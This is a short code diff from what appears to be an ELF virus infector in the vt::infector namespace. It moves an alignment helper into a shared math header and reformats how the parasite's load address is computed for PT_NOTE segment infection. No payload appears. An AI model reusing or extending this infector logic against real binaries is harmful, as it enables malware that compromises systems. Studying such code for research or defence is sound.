@@ -3,6 +3,7 @@
 #include <algorithm>
 #include "common/file_descriptor.hh"
 #include "common/macros.hh"
+#include "common/math.hh"
 #include "common/patch_pattern.hh"
 #include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
@@ -11,11 +12,6 @@
 namespace vt::infector {
 
 namespace {
-
-uint64_t round_up_to(uint64_t v, uint64_t alignment) {
-  return (v & ~(alignment - 1)) + alignment;
-}
-
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
                uint64_t virus_offset, Elf64_Off original_pt_note_file_offset,
                Elf64_Addr parasite_load_address) {
@@ -85,9 +81,10 @@ bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
       // segments.
       auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
       auto potential_virus_loading_addr = last_byte_of_segment + 1;
-      parasite_load_address_ = std::max(
-          parasite_load_address_,
-          round_up_to(potential_virus_loading_addr, phdr_entry->p_align));
+      parasite_load_address_ =
+          std::max(parasite_load_address_,
+                   common::round_up_to(potential_virus_loading_addr,
+                                       phdr_entry->p_align));
       // copy alignment so later we can assign to PT_NOTE.
       pt_load_alignment_ = phdr_entry->p_align;
     } else if (phdr_entry->p_type == PT_NOTE) {
